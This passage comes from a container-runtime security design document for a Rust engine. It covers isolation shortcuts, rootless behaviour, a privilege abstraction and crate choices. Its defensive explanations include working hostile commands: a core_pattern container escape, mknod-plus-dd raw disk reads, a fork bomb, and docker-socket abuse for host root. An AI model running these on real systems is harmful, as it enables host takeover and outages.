- **`mount --bind /dev/xxx <rootfs>/dev/xxx`** — no `CAP_MKNOD` needed, works
  rootless, and the node keeps the host's ownership.

`[C] HIGH` — runc uses `mknod` when it has `CAP_MKNOD` and falls back to bind
mounting when it does not (rootless). `[R]` **We should bind-mount
unconditionally.** Reasoning: it is the one mechanism that works in both
privilege modes, so there is one code path instead of two; the ownership
difference is invisible because the device cgroup, not the file mode, is the
access control. Tradeoff: bind mounts show up in `mountinfo` (one line per
device — 6+ extra lines) and cannot be created for a device that does not
exist on the host, whereas `mknod` can fabricate a node for a driver loaded
later. Neither matters for us.

`[F] HIGH` — **`MS_NODEV`** on a mount makes device nodes on that filesystem
inert: opening a char/block node returns `EACCES` regardless of its mode. This
is why every container mount except `/dev` is `nodev`.
`[O] host-a HIGH` — verified: `/proc`, `/sys`, `/dev/shm`, `/dev/mqueue`,
`/sys/fs/cgroup` are all `nodev`; **`/dev` itself is `rw,nosuid` and
deliberately *not* `nodev`**; `/dev/pts` is `nosuid,noexec` but also not
`nodev`.

`[R] HIGH` — Requirement: **`nodev` on every mount we create except `/dev`
and `/dev/pts`, and `nodev` on every user-supplied volume unless explicitly
overridden.** Without it, `CAP_MKNOD` (which is in Docker's default set,
§8.3) plus a writable volume equals raw disk access:
`mknod /vol/disk b 253 0 && dd if=/vol/disk` reads the host filesystem
directly, bypassing every path-based control. The device cgroup blocks this
today — so it takes *two* failures — but `nodev` costs one flag.

`[R] MED` — Also worth setting: `nosuid` on every mount (verified: Docker
does), and `noexec` on `/dev/shm` and `/proc` (verified: Docker does; `/dev`
itself is *not* `noexec`, which means a container can write and execute a
binary in `/dev` — a small, well-known gap that Docker accepts because some
images use `/dev/shm` for JIT scratch. `[R]` Set `noexec` on `/dev` and
provide an opt-out.)
---

## 16. Process isolation vs security isolation

### 16.1 The distinction, operationally

`[R] HIGH` — Stated so it cannot be misread:

- **Process isolation** = the container **cannot see or accidentally interfere
  with** the host and other containers. Delivered by: PID, mount, network,
  IPC, UTS namespaces; a separate rootfs; cgroup accounting. The threat model
  is *mistakes*.
- **Security isolation** = the container **cannot escalate to host privilege
  even when it is actively trying**. Delivered by: a user namespace (or a
  non-root uid), a capability bounding set, a seccomp filter, an LSM profile,
  masked/read-only `/proc` and `/sys`, a device cgroup, and no leaked fds. The
  threat model is *an adversary*.

**Process isolation is a subset of what you need and gives no security
guarantee whatsoever.**

### 16.2 The concrete example

`[R] HIGH` — Take a container that is *fully* process-isolated:
`clone(CLONE_NEWPID|CLONE_NEWNS|CLONE_NEWNET|CLONE_NEWIPC|CLONE_NEWUTS)`,
`pivot_root` into an extracted image, `mount -t proc proc /proc`, `mount -t
sysfs sysfs /sys`, a fresh `/dev`, and a cgroup with `memory.max` and
`pids.max` set. `ps` inside shows one process. `ip addr` shows one interface.
`df` shows the image. Nothing on the host is visible. **By any reasonable
definition of "container", this works.**

It is escapable in one command:
```sh
echo '|/bin/sh -c "cp /bin/busybox /host-visible && chmod +s ..."' \
    > /proc/sys/kernel/core_pattern
```
Because: the container runs as uid 0, uid 0 is host uid 0 (no user namespace),
so it has `CAP_SYS_ADMIN`; `/proc/sys` was mounted fresh and is **writable**;
`kernel.core_pattern` is **not namespaced**; and the kernel executes the
pipe program **as host root in the initial namespaces**. Trigger a core dump
and you have host code execution.

Every namespace worked perfectly. Not one of them was a security control
against this.

### 16.3 The dangerous-shortcuts list

Each row: the shortcut, why implementations ship it, and the concrete
consequence.

| # | shortcut | why it appears | concrete consequence |
|---|---|---|---|
| 1 | **`chroot` instead of `pivot_root`** | `chroot` is one syscall and "works" | The old root remains reachable: `mkdir /esc && chroot /esc` from a second `chroot`, or simply `fchdir` on an fd opened before the `chroot`, escapes. `chroot` is not a security boundary and never was — it does not detach the old root from the mount namespace. (Mechanism is D1's; the *requirement* — `pivot_root` + `umount2(old_root, MNT_DETACH)` — is ours.) |
| 2 | **no `MS_PRIVATE` on `/` before mounting** | the tutorial omits it | Mounts propagate **back to the host**. Our `/dev` tmpfs, our bind mounts, our masked paths all appear on the host's mount table and never go away; and the host's later mounts appear inside the container. Also makes `umount` of the old root fail. Required: `mount(NULL,"/",NULL,MS_REC\|MS_PRIVATE,NULL)` first. |
| 3 | **all capabilities retained** | it is the default; dropping needs code | `CAP_SYS_ADMIN` ⇒ §8.6's three escapes. `CAP_SYS_MODULE` ⇒ load a kernel module, game over in one step. There is no partial credit here. |
| 4 | **no seccomp** | libseccomp is a dependency and BPF is scary | ~330 syscalls exposed that Docker's profile denies. Concretely: `unshare` ⇒ CVE-2022-0492; `bpf` ⇒ kernel memory read; `userfaultfd` ⇒ a reliable primitive for winning kernel races; `keyctl` ⇒ host keyring; `io_uring` ⇒ its own CVE stream. Also loses the defence-in-depth over kernel capability-check bugs (§9.6). |
| 5 | **writable `/proc`** | a fresh `proc` mount is writable | `core_pattern` (§16.2), `modprobe`, `sysrq-trigger` ⇒ host RCE / panic. Required: read-only bind of `/proc/{bus,fs,irq,sys,sysrq-trigger}` + masks (§11.2). |
| 6 | **writable `/sys`** | a fresh `sysfs` mount is writable | `/sys/kernel/uevent_helper` ⇒ host root exec (same shape as `core_pattern`); `/sys/class/*/*/uevent`; `/sys/kernel/security` ⇒ LSM interference. Required: `ro`. |
| 7 | **`/sys/fs/cgroup` writable** (esp. v1) | it is needed for nested containers | v1 `release_agent` ⇒ host root (CVE-2022-0492, §11.5). Required: v2 only, `ro` by default. |
| 8 | **sharing the host PID namespace** | `--pid=host` "for debugging" | `/proc/1/root/` is the host filesystem; with `CAP_SYS_PTRACE` you inject code into a host root process. Equivalent to `--privileged` in effect. |
| 9 | **sharing the host network namespace** | it is easier than veth+NAT (D4's whole problem) | The container reaches every host-local service — including `127.0.0.1:2375` if the Docker API is bound there, cloud metadata at `169.254.169.254`, and any localhost-trusting database. Also `CAP_NET_ADMIN`, if held, reconfigures the **host** network. |
| 10 | **sharing the host IPC namespace** | rarely deliberate; usually just not implemented | SysV shm/sem/msg segments of host processes are readable and writable ⇒ read another process's shared memory, corrupt a database's shm. Also `/dev/shm` shared. |
| 11 | **root-in-container == root-on-host (no userns)** | userns needs uid mapping, subuid, and idmapped mounts or `chown` | Every other control becomes load-bearing: a bug in any one of caps/seccomp/LSM/proc-masking is immediately host root. `[O] host-a` confirms this **is** Docker's default (§10.4), which is why Docker's other controls are as thorough as they are. |
| 12 | **no cgroup limits** | limits are the "advanced" feature you add later | A fork bomb (`:(){ :\|:& };:`) exhausts host pids and the host stops accepting logins — no exploit needed, and it is what an *accident* looks like. An unbounded allocation triggers the **host** OOM killer, which may kill an unrelated service. `[O] host-a` — note Docker itself relies on systemd's `DefaultTasksMax` for the pids backstop (§2.4); with a bare `fs` driver there is no backstop at all. |
| 13 | **fds leaked across `execve`** | the fds are invisible; nothing fails | CVE-2024-21626 (§12.4): a leaked `/sys/fs/cgroup` dirfd plus `cwd=/proc/self/fd/7` is full host filesystem access. Required: `O_CLOEXEC` everywhere + `close_range` before exec. |
| 14 | **bind-mounting the host `/`** | "just for this one debug container" | Nothing left to discuss; the container is the host. |
| 15 | **bind-mounting the Docker/engine socket** | CI images that build images | The socket is an unauthenticated root API. `docker run -v /:/host --privileged` from inside ⇒ host root. Our engine's socket has the same property, so its permissions and any `-v` of it must be treated as equivalent to root access. |
| 16 | **no `nosuid`/`nodev` on mounts** | mount flags are easy to forget | `nodev` missing + `CAP_MKNOD` ⇒ `mknod` a block device on a writable volume and read the host disk (§15.3). `nosuid` missing ⇒ a set-UID binary in the image or on a volume is a privilege path, especially with `no_new_privs` off. |
| 17 | **no `no_new_privs`** | Docker's own default is off | Set-UID binaries inside the container work; combined with #11 that is host root via any set-UID-root binary in the image. `[O] host-a` — `NoNewPrivs: 0` on a live default container (§8.2). |
| 18 | **`/proc/self/exe`-based re-exec** | it is how runc does it | CVE-2019-5736 (§12.1): the container overwrites the host runtime binary. Required: sealed `memfd`, or no re-exec. |
| 19 | **string-concatenated paths into the rootfs** | it is the obvious way | Symlink TOCTOU: the bind mount lands on the host's file (§12.5). Required: `openat2(RESOLVE_IN_ROOT\|RESOLVE_NO_MAGICLINKS)`. |
| 20 | **dynamically-linked helper entering the container fs** | Go/Rust default to it | CVE-2019-14271 (§12.3): the container supplies your `libnss`. Required: static, or never enter. |

`[R] HIGH` — Of these twenty, the ones that are **cheapest to get right and
most often skipped** are: #2 (`MS_PRIVATE`, one syscall), #13 (`O_CLOEXEC`,
a flag), #16 (`nosuid,nodev`, two flags), #17 (`no_new_privs`, one `prctl`),
and #12 (a default `pids.max`, one file write). **Five lines of code cover the
five cheapest items on the list**, and skipping them is what separates an
educational container from an unsafe one.
---

## 17. Rootless: what works, what degrades, what lies

The failure *mode* matters more than the failure. A loud failure is a support
question; a quiet one is a security incident three weeks later.

| capability | rootless outcome | fails loudly / quietly / degrades | evidence |
|---|---|---|---|
| create user namespace | **works** | — | `[O] old-host`: `unshare -Ur` → uid 0 in-ns, all 41 caps |
| map more than one uid | **fails** without `/etc/subuid` | **loudly** (`EPERM` on the map write; `newuidmap` prints "not allowed") | `[O] old-host` §10.2 |
| `chown` a file to an unmapped uid | **fails** | **quietly-ish** — `EINVAL`, which reads like a bug in *our* code, not a config problem | `[O] old-host` §10.3 |
| drop to a service uid (`nobody`, `www-data`) | **fails** | **loudly but confusingly** (`setresuid: Invalid argument`) | `[O] old-host` §10.3 |
| mount `tmpfs` in userns+mntns | **works** | — | `[O] old-host`: rc=0 |
| mount `proc` in userns+mntns **without** a new pidns | **fails** | loudly (`EPERM`) | `[O] old-host`: `mount -t proc` → "permission denied"; **succeeds** with `unshare -Urmpf --mount-proc` |
| mount `sysfs` in userns+mntns **without** a new netns | **fails** | loudly (`EPERM`) | `[O] old-host`: fails with `-Urm`, **succeeds** with `-Urmn` (rc=0) |
| mount `cgroup2` in a userns | **fails** on this host | loudly (`EPERM`) | `[O] old-host` §2.2 |
| overlayfs in a userns | **works on RHEL 8** (backport), needs 5.11 upstream | degrades to `fuse-overlayfs` | `[O] old-host` §7.2: mount rc=0, write works, no `userxattr` in options; `/usr/bin/fuse-overlayfs` present |
| create veth / bridge **inside** the container's netns | **works** | — | `[O] old-host`: `unshare -Urn ip link add v0 type veth peer name v1` → rc=0; `ip link add br0 type bridge` → rc=0 |
| move one veth end to the **host** netns | **fails** | loudly (`EPERM`) — needs `CAP_NET_ADMIN` in the host netns | not tested; `[F] HIGH` from `capabilities(7)`/`ip-link(8)`. D4 owns this. |
| bind port 80 **inside** the container's own netns | **works** | — | `[O] old-host`: `unshare -Urn python3 -c 'socket().bind(("0.0.0.0",80))'` → **`bind80_ok`** |
| publish a host port <1024 | **fails** | loudly | needs `CAP_NET_BIND_SERVICE` on the host or `net.ipv4.ip_unprivileged_port_start` lowered |
| cgroup limits (`--memory`, `--pids-limit`) | **fails** without a delegated subtree | **this is the dangerous one — see below** | `[O] old-host` §2.2 |
| device cgroup (BPF) | **fails** | loudly (`EPERM` from `bpf(2)`) | `[O] old-host`: `unprivileged_bpf_disabled = 1` (permanent) |
| `mknod` a device node | **fails** | loudly (`EPERM`) | `[F]` §15.3; bind-mount instead |
| seccomp filter install | **works** (with `no_new_privs`) | — | `[F]` §9.2; my empirical probe was inconclusive (`LOW`) |
| capability bounding-set drop | **works** | — | `prctl(PR_CAPBSET_DROP)` needs `CAP_SETPCAP` in the ns, which a userns creator has |
| AppArmor profile transition | **fails** for unprivileged users | quietly (`unconfined`) | `[F] MED` — loading a profile needs `CAP_MAC_ADMIN` in the init ns; profile *stacking* for unprivileged users landed later |

`[O] host-a HIGH — one relevant Docker default worth knowing about ports.**
Inside a live container:
```
/proc/sys/net/ipv4/ping_group_range     -> 0  2147483647
/proc/sys/net/ipv4/ip_unprivileged_port_start -> 0
```
Docker sets both in the container's net namespace. The second means
**`CAP_NET_BIND_SERVICE` is effectively unnecessary inside a Docker
container** — any uid can bind port 80. `[R]` We should do the same (it is
what makes `USER nginx` images work) and can then drop
`CAP_NET_BIND_SERVICE` from the default set — a small, free reduction.

### 17.1 The one that fails quietly, and why it is the important one

`[R] HIGH` — **cgroup limits without delegation is the failure mode that
matters**, because the natural implementation succeeds at every step:
`mkdir` fails ⇒ many implementations log-and-continue; or the `mkdir`
succeeds in a delegated subtree but the *controller* is not in the parent's
`subtree_control` ⇒ `memory.max` does not exist ⇒ `write` fails with `ENOENT`
⇒ log-and-continue. Either way the container runs, `docker inspect` reports
`Memory: 536870912`, and nothing is enforced.

`[R] HIGH` — Rootless cgroup delegation requires **all** of:
1. cgroup v2 unified (not v1 — §6.1, structurally impossible on v1),
2. a systemd **user** session (`user@<uid>.service`) with `Delegate=` set,
3. the wanted controllers present in
   `/sys/fs/cgroup/user.slice/user-<uid>.slice/user@<uid>.service/cgroup.controllers`,
4. the process actually inside that subtree (a `machinectl shell` or a
   `systemd-run --user --scope`, not a bare `ssh` session on some configs).

`[O] old-host HIGH` — **Zero of the four hold.** v1 only; no delegation
anywhere; every controller root is mode `555`; the session dirs the kernel
names in `/proc/self/cgroup` for `pids`/`memory` are not even present as
directories. `[R]` So the honest answer for this host is
**"we cannot limit resources here"**, and §6.3's tier table is how we say it.

`[R] HIGH` — Required behaviour, restating §6.3 in rootless terms:
**probe for a writable, controller-enabled subtree at startup, record the
answer in one place, and make any explicitly-requested limit a hard error when
the answer is "none".** The probe is: resolve our own cgroup from
`/proc/self/cgroup`'s `0::` line, walk up to find a directory we can `mkdir`
in, and check its `cgroup.controllers`. Do it once; do not retry per container.
---

## 18. Which rootless retrofits are structurally expensive, and the one seam

The project has decided root-first. That is fine. What follows is the list of
places where "assume root" leaks into *types and control flow* rather than into
one function — those are the expensive ones — and the single seam that keeps
them cheap.

### 18.1 Expensive retrofits (ranked by cost of doing them later)

1. **`uid_map` written after an `execve`.** `[O]` §10.2 proves this is not a
   style question: a process that has `execve`'d since `unshare(CLONE_NEWUSER)`
   has **zero capabilities** and cannot write the map. If the engine's
   architecture is "daemon forks, child re-execs a helper, helper sets
   everything up", the map must be written by the **daemon** into
   `/proc/<child>/uid_map` while the child waits. Retrofitting that means
   inverting who does the setup — a change to the process topology, not to a
   function. **Cost if deferred: high. Cost now: one sync pipe you need
   anyway.**
2. **Absent `Option<IdMapping>` on the mount abstraction.** If every mount call
   takes `(source, target, fstype, flags, data)` and idmapped mounts arrive
   later, every call site changes, plus the mount must be performed in two
   steps (`open_tree(OPEN_TREE_CLONE)` → `mount_setattr` → `move_mount`)
   instead of one `mount(2)`. That is a different syscall sequence, not an
   extra argument. **Cost if deferred: high.**
3. **Privilege-conditional behaviour scattered as `if is_root()`.** Every one
   of these is a policy decision that belongs in one place: whether to `mknod`
   or bind-mount devices (§15.3), whether to attach a BPF device program
   (§15.2), whether to set cgroup limits (§17.1), whether to create veth or
   call a userspace network helper (D4), whether to `chown` extracted layers
   (§10.5), whether to load an AppArmor profile (§13.3). Scattered, they are
   ~15 branches that drift out of sync. **Cost if deferred: medium but
   pervasive — the worst kind.**
4. **`0` meaning both "unlimited" and "unspecified".** §6.3: if the resource
   config uses `0` for "no limit" like Docker's API does, we cannot produce the
   error in §17.1 because we cannot tell that the user asked. Retrofitting is
   an API-visible type change. **Cost if deferred: medium, and it is
   user-facing.**
5. **Assuming `/proc/self/mountinfo` and `/sys/fs/cgroup` are writable/complete
   at startup.** Rootless sees a different mount table and a different cgroup
   root. If discovery is done lazily and its result is threaded through calls,
   there is no single place to substitute the rootless answer.
   **Cost if deferred: low-medium.**
6. **A multithreaded process performing container setup.** §9.2: seccomp
   `TSYNC`, `unshare(CLONE_NEWUSER)` semantics, and `fork` safety all get worse
   with threads. If the setup path ends up inside a tokio runtime, extracting
   it later is a restructure. **Cost if deferred: high.** (D2 owns the async
   decision; this is the constraint it must satisfy.)

### 18.2 Cheap retrofits (do not pre-build these)

- `newuidmap`/`newgidmap` invocation — one function, called from the one place
  in 18.1(1).
- `fuse-overlayfs` fallback — a storage-driver selection, which D3 already
  needs to be pluggable for other reasons.
- `slirp4netns` / `pasta` networking — D4's driver seam.
- Port-forwarding helper for <1024 — an out-of-process detail.
- XDG-based state directories (`$XDG_RUNTIME_DIR` instead of `/run`) — a path
  constant.

### 18.3 The seam

`[R] HIGH — one value, threaded from the top, that every privileged operation
consults; and the operations themselves live behind capability-shaped traits,
not behind `if root`.**

```rust
/// Determined ONCE at engine startup by probing (§7.2 rules: probe, never
/// version-sniff). Immutable thereafter. The single source of truth about
/// what this process is allowed to do.
struct Privilege {
    euid: Uid,
    /// caps we actually hold in the INITIAL user namespace
    host_caps: CapSet,
    /// Some(range) if /etc/subuid grants us one; None => single-uid only
    subid: Option<SubIdRanges>,
    /// Some(path) if we found a writable, controller-enabled cgroup subtree
    cgroup_root: Option<CgroupRoot>,
    kernel: KernelFeatures,     // cgroup.kill?, openat2?, idmapped mounts?, ...
    lsm: LsmState,              // apparmor enabled?, selinux enforcing?
}
```

**The three rules that make this work:**

1. **Nothing below the top level calls `geteuid()`, `capget()`, or reads
   `/etc/subuid`.** They receive `&Privilege`. This is the whole discipline; if
   it is enforced, rootless is a matter of constructing a different
   `Privilege` and filling in the drivers, not of finding branches.
2. **Every operation that *can* fail for privilege reasons returns a
   three-valued result, not two:** `Applied`, `Skipped(reason)`, or
   `Failed(err)`. `Skipped` is what an unrequested default does when it cannot
   be applied; `Failed` is what an explicitly-requested setting does. §6.3's
   "requested ⇒ hard error, defaulted ⇒ logged note" is only expressible if
   the type distinguishes them. `[R]` This is the second type-level decision
   (with 18.1(4)) that is expensive to add later and nearly free now.
3. **Privilege-dependent *mechanisms* go behind traits chosen once at startup**
   — `CgroupManager` (§2.3), `MountBackend` (mount(2) vs open_tree+mount_setattr),
   `DeviceController` (BPF vs none), `NetworkDriver` (D4), `StorageDriver`
   (D3). Selection happens in one factory function that takes `&Privilege`.
   The rest of the engine never knows which was chosen.

`[R] HIGH` — **What the code should assume about privilege: nothing, except
what `Privilege` says.** And `Privilege` should be constructed by probing, not
by `if euid == 0`. Concretely: a root process in a container with a 14-cap
bounding set is *not* privileged for our purposes, and `euid == 0` would lie
about it — which is exactly the situation for anyone running our engine inside
Docker to test it.

`[R] MED` — Tradeoff of this design, stated honestly: threading a `&Privilege`
through the engine is boilerplate, and for a root-only v1 it buys nothing
visible. The argument for paying it now is 18.1 — six items, three of them
"high cost if deferred", all of which this seam converts to "low". If we skip
it, the rootless work later is a rewrite of the container-setup path rather
than an addition to it.
---

## 19. Rust crates in this area

Health figures pulled from the crates.io API on 2026-09-04.

### 19.1 seccomp: `seccompiler` vs `libseccomp` vs hand-built BPF

| crate | version / last release | downloads (recent 90d) | what it is |
|---|---|---|---|
| `seccompiler` | 0.5.0 / 2025-03-07 | 19.3M total, 5.7M recent | rust-vmm's pure-Rust cBPF compiler. Takes a rule DSL (or JSON), emits `sock_filter` arrays, installs via `seccomp(2)`. **No C dependency.** |
| `libseccomp` | 0.4.0 / 2025-04-05 | 1.9M total, 344k recent | bindings to C `libseccomp`. Needs `libseccomp` ≥ 2.5 at build and run time. |

`[R] HIGH — use `seccompiler`, or hand-build. Do not use `libseccomp`.**

Reasoning:
- **`libseccomp` brings a C dependency for something that produces a byte
  array.** `[O] host-a` — runc 1.2.5 reports `libseccomp: 2.5.5`, i.e. it
  is a runtime-linked dependency with its own version skew. For a project whose
  point is owning the runtime core, a C library that generates BPF is the
  wrong kind of dependency.
- **`libseccomp` cannot express the `ENOSYS`-above-max rule (§9.6).** That is
  precisely why runc has to *patch the generated program*
  (`patchbpf/enosys_linux.go`). With `seccompiler` or hand-built BPF we emit
  those two instructions directly. **This alone decides it.**
- `seccompiler` handles the tedium correctly: per-architecture `arch` checks,
  the `SCMP_CMP_MASKED_EQ`-equivalent argument comparisons, 64-bit argument
  comparison as two 32-bit loads (a real source of bugs — cBPF registers are
  32-bit), and the jump-distance limits. It is also what Firecracker uses,
  which is a meaningful pedigree for a jailer.
- **Hand-building is genuinely viable and worth doing at least once**, because
  the mechanism is the point: ~8 cBPF opcodes, a `Vec<sock_filter>`, and one
  `seccomp(2)` call. The parts that are easy to get wrong are the 64-bit
  comparisons and the jump arithmetic. `[R]` Write the filter by hand first as
  a learning exercise, then decide whether `seccompiler` earns its place. It
  probably does, for the jump arithmetic alone.
- `[R]` Whichever we choose, we **must not** let it hide the `arch` check
  (§9.4) or the `ENOSYS` rule (§9.6). Both must be visible in our code.

### 19.2 Capabilities: `caps`

`caps` 0.5.6 / 2025-10-17, 23.4M downloads, 7.4M recent, pure Rust, no C deps.

`[R] MED — use it, but know that it is thin.** It wraps `capget`/`capset`,
`prctl(PR_CAPBSET_DROP)`, `prctl(PR_CAP_AMBIENT_*)`, and reads
`/proc/<pid>/status`. That is maybe 200 lines of `unsafe` we would otherwise
write, and getting the `capget`/`capset` v3 header struct and the two-`__u32`
split right is fiddly and easy to get subtly wrong. Good maintenance, good
download count, actively released.

`[R] HIGH` — What `caps` does **not** do, and what we must therefore own: **the
ordering in §8.5.** `caps` gives you primitives; the sequence
(`KEEPCAPS` → `setgroups` → `setgid` → `setuid` → bounding drop → `capset` →
ambient → `no_new_privs`) is the part that matters and no crate will get it
right for us. **Do not let the crate's convenience hide the ordering; write
the sequence as one explicit, commented function.**

### 19.3 cgroups: `cgroups-rs`, youki's `libcgroups`, or plain `std::fs`

| option | version / release | recent d/l | assessment |
|---|---|---|---|
| `cgroups-rs` | 0.5.1 / 2026-07-14 (Kata Containers) | 1.0M | v1 + v2, healthy, but models cgroups as a controller-object hierarchy |
| `libcgroups` | 0.7.0 / 2026-07-25 (youki) | 41k | v1 + v2 + systemd D-Bus driver; effectively youki's internals published |
| plain `std::fs` | — | — | `write!(file, "{}", bytes)` |

`[R] HIGH — plain `std::fs`. This is the clearest "no crate needed" call in
the document.**

Reasoning, and I want to be blunt because this is where projects add
dependencies reflexively:
- **cgroupfs is a directory tree of small text files.** `mkdir`, `write`,
  `read`, `rmdir`. The v2 write side is *nine* files for a complete
  implementation: `cgroup.subtree_control`, `cgroup.procs`, `memory.max`,
  `memory.low`, `memory.swap.max`, `cpu.max`, `cpu.weight`, `pids.max`,
  `io.max`. The read side is a handful of flat-keyed files whose parser is
  `line.split_once(' ')`.
- **A crate cannot abstract the hard parts.** The hard parts are: the
  no-internal-process rule (§1.3), delegation and the systemd single-writer
  discipline (§2.3), swap arithmetic (§3.1), OOM detection semantics (§4.2),
  and the kill ordering (§5.2). Those are *policy*, and every crate above
  leaves them to the caller — `cgroups-rs`'s API will happily let you violate
  the no-internal-process rule and hand you the `EBUSY`.
- **A crate adds an error type we have to translate and a data model we have
  to fight.** `cgroups-rs`'s controller objects are a v1-shaped abstraction;
  v2 has no controller objects.
- **The one thing worth borrowing is knowledge, not code.** `libcgroups`'
  systemd D-Bus driver is the reference to *read* if we ever build §2.3's
  systemd path.

`[R] HIGH` — What we should write instead is about 300 lines: a `CgroupRoot`
holding an `O_PATH` dirfd, `openat`-relative writes (so we never re-resolve
paths — §12.5), a flat-key parser, and the `CgroupManager` trait from §2.3.
`[R]` Use `rustix` (1.1.4, 1.1B downloads) or `nix` (0.31.3, 770M) for the
`openat`/`statfs`/`mount` syscalls rather than raw `libc` — both are
essentially universal and `rustix` has a smaller `unsafe` surface and no
`libc` linkage requirement.

### 19.4 eBPF for the v2 device controller: `aya` vs `libbpf-rs` vs by hand

| option | version | recent d/l | assessment |
|---|---|---|---|
| `aya` | 0.14.0 / 2026-06-24 | 1.4M | pure Rust, no libbpf/libelf; built for loading ELF objects, maps, BTF, CO-RE |
| `libbpf-rs` | 0.27.1 / 2026-09-03 | 1.5M | wraps C `libbpf`; needs `libbpf` + `libelf`, and a clang-built BPF object |

`[R] HIGH — hand-assemble the program. Neither crate.**

`[O] host-a` (§15.2) is the evidence: runc's `cgroup_device` program is
**552 bytes xlated / 361 bytes jited**, with no maps, no helper calls, no BTF
and no relocations. It is a straight-line comparison chain over three integers.
Both crates exist to solve problems this program does not have — ELF loading,
map management, CO-RE relocation, BTF type matching. Using either means adding
a build-time BPF toolchain (clang for `libbpf-rs`) or a large runtime
dependency (`aya`) to emit ~70 instructions.

`[R] MED` — What we need instead: an eBPF instruction encoder for roughly
`BPF_LDX_MEM`, `BPF_MOV64_IMM`, `BPF_ALU64_IMM(AND)`, `BPF_JMP_IMM(JNE/JEQ)`,
`BPF_EXIT_INSN`, plus `bpf(BPF_PROG_LOAD)` and `bpf(BPF_PROG_ATTACH,
BPF_CGROUP_DEVICE, BPF_F_ALLOW_MULTI)`. ~150 lines including the struct
definitions. And it teaches us the mechanism, which is the project's stated
goal. Tradeoff: the BPF verifier's error messages are the only feedback, and
they are terse — budget an afternoon for the first program to load.

### 19.5 LSM crates

`[R] HIGH — none needed.**
- **AppArmor**: applying a profile is `write("/proc/self/attr/apparmor/exec",
  "exec <profile>")`. Loading a profile is `apparmor_parser -Kr <file>` as a
  subprocess (there is no stable library API worth binding; `libapparmor`'s
  `aa_change_onexec` is a wrapper around that same write). Detection is
  reading `/sys/module/apparmor/parameters/enabled`. Zero crates.
- **SELinux**: `write("/proc/self/attr/exec", "<label>")` for the exec label;
  `setxattr(path, "security.selinux", label)` for file labels. The genuinely
  hard part — computing a valid label from policy, allocating MCS categories —
  needs `libselinux`, and §13.3 defers it indefinitely. `[R]` If we ever get
  there, shell out to `chcon`/use `setxattr` directly rather than binding
  `libselinux`; the `selinux` crate exists but wraps a C library for what is
  mostly two xattr writes plus policy queries we will not make.

### 19.6 Summary table

| need | verdict |
|---|---|
| seccomp filter generation | **`seccompiler`** (or hand-built); never `libseccomp` |
| capability sets | **`caps`** for primitives; own the ordering |
| cgroup v2 read/write | **`std::fs` + `rustix`**; no cgroup crate |
| cgroup systemd driver | defer (§2.3); read youki's `libcgroups` if needed |
| BPF device controller | **hand-assembled**; no `aya`, no `libbpf-rs` |
| AppArmor / SELinux | **no crate** — two `/proc/self/attr` writes |
| syscall layer generally | **`rustix`** (preferred) or **`nix`** |
| `/proc` parsing | **own it** — `procfs` (0.18.0) is fine but we need ~5 fields |

`[R] HIGH` — Net dependency count for everything in this document: **three**
(`seccompiler`, `caps`, `rustix`). Every other option adds a C library, a
build-time toolchain, or an abstraction over text files.
---

## 20. Handoff

Findings that belong to another agent's domain, stated as requirements rather
than researched here.

### To D1 (namespace creation, `clone`/`unshare` ordering, `pivot_root`, mounts)

1. **The setup process must be single-threaded** at the point where it
   `unshare(CLONE_NEWUSER)`s, drops capabilities, installs seccomp, and
   `execve`s. Reason: §9.2 (`TSYNC`) and §10.2 (caps lost at `execve`).
2. **`uid_map`/`gid_map` must be written by the *parent* into
   `/proc/<child>/uid_map` while the child blocks on a sync pipe** — the child
   cannot write it after any `execve`. `[O]` §10.2 has the `EPERM` and the
   `CapPrm: 0`.
3. **`setgroups` must be written `deny` before `gid_map`**, and after `gid_map`
   is written it can never be re-enabled (`[O]` §10.2).
4. **`mount -t proc` requires the mount namespace's userns to own a PID
   namespace**; `mount -t sysfs` requires it to own a net namespace. `[O]`
   `old-host` verified both: `EPERM` without, rc=0 with. So the namespace
   creation order constrains the mount order.
5. **`unshare -Up` without `-f` gives `fork: Cannot allocate memory`** — the
   pidns has no init. `[O]` `old-host`. Whoever enters a new pidns must be its
   PID 1.
6. `MS_PRIVATE` on `/` before any mount (§16.3 #2); `pivot_root` not `chroot`
   (#1); `nosuid,nodev` on everything but `/dev` (§15.3); `MS_NOSYMFOLLOW`
   where available.
7. **Read-only bind requires two steps** (`MS_BIND`, then
   `MS_REMOUNT|MS_BIND|MS_RDONLY`) on `mount(2)`, or one atomic
   `mount_setattr(AT_RECURSIVE, MOUNT_ATTR_RDONLY)` on 5.12+ (§11.3).
8. **Every mount API must carry `Option<IdMapping>`** from day one (§18.1(2)),
   and idmapped mounts need `open_tree(OPEN_TREE_CLONE)` →
   `mount_setattr(MOUNT_ATTR_IDMAP)` → `move_mount`, not `mount(2)`.

### To D2 (runtime architecture, OCI lifecycle, Rust substrate, async)

1. **The async decision is constrained by §9.2 / §18.1(6): container setup
   cannot run on a multithreaded runtime.** Either the setup path is a separate
   single-threaded process/`fork` child, or we do not use a threaded async
   runtime in the daemon's fork path.
2. **`Privilege` struct + `KernelFeatures` probe, constructed once at startup,
   threaded read-only** (§18.3). This is the seam the whole rootless story
   hangs on.
3. **Three-valued results for privileged operations** — `Applied` /
   `Skipped(reason)` / `Failed(err)` (§18.3 rule 2). Needed to implement
   "requested limit that cannot be applied is a hard error" (§6.3).
4. **`Option<u64>` not `0` for resource limits** (§6.3, §18.1(4)).
5. **`CgroupManager` trait** with the seven methods in §2.3, speaking our
   `Resources` type, never cgroupfs filenames.
6. **Get PID 1's pidfd from `clone(CLONE_PIDFD)`; never store a bare pid for
   signalling** (§5.5). It also gives a pollable exit notification.
7. **Wait on `cgroup.events:populated`, not on PID 1's exit**, for container
   teardown (§5.4).
8. **No re-exec of our own binary into the container unless it is a sealed
   `memfd`** (§12.1). Preferably no re-exec at all — Rust lets us avoid Go's
   forced dance.
9. **`O_CLOEXEC` on every fd we open, plus `close_range` before `execve`**
   (§12.4). Worth a wrapper type that makes non-`CLOEXEC` opens hard.
10. **`openat2(rootfs_fd, path, RESOLVE_IN_ROOT|RESOLVE_NO_MAGICLINKS)` for
    every container-side path** (§12.5). Never string concatenation.
11. **Never call `getpwnam`/`getaddrinfo`/`getgrnam` from code that has entered
    the container's filesystem view** (§12.3) — parse the container's
    `/etc/passwd` ourselves.
12. **Recommended kernel floor: 5.15 supported, 5.10 unsupported-but-probably,
    6.x for development** (§7.3). Explicitly not RHEL 8 / 4.18.
13. **`--privileged` as one function setting eleven fields, with a warning**
    (§14).

### To D3 (images, layers, OverlayFS, tar extraction)

1. **uid-shifting is the expensive part of rootless storage.** Without
